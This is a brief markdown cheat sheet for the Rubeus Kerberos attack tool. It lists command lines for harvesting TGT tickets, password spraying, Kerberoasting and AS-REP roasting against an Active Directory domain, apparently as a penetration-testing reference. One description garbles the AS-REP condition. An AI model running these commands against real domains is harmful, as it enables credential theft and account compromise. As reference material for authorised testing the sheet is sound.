# Rubeus

## Ticket Harvesting

Listen for incoming TGT calls on the DC. Allows to harvest TGT tickets and users in the domain

```
Rubeus.exe harvest /interval:<seconds>
```

## Password Spraying

Allows to spray a selected password against the users detected with the previous attack

```
Rubeus.exe brute /password:<password> /noticket
```

## Kerberoast

Returns a list of services vulnerable to Kerberoast attacks and relative Kerberos Hash

```
Rubeus.exe kerberoast
```

## AS-REP Roasting

Returns hasehs of users with  the flag "Do not require Kerberos pre-authentication" disabled

```
Rubeus.exe asreproast
```
